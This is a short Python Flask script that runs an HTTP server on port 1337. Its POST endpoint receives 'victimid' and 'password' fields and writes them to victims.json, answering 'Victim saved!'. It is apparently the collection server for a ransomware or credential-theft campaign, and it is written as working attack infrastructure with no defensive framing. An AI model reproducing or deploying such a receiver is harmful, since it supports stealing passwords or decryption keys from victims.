from flask import Flask, request
import json

app = Flask(__name__)

@app.route("/magnus", methods=["POST"])
def receive_data():
    data = request.form
    victim_id = data["victimid"]
    password = data["password"]
    data_to_save = {"victimid": victim_id, "password": password}
    with open("victims.json", "w") as outfile:
        json.dump(data_to_save, outfile)
    return "Victim saved!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337)
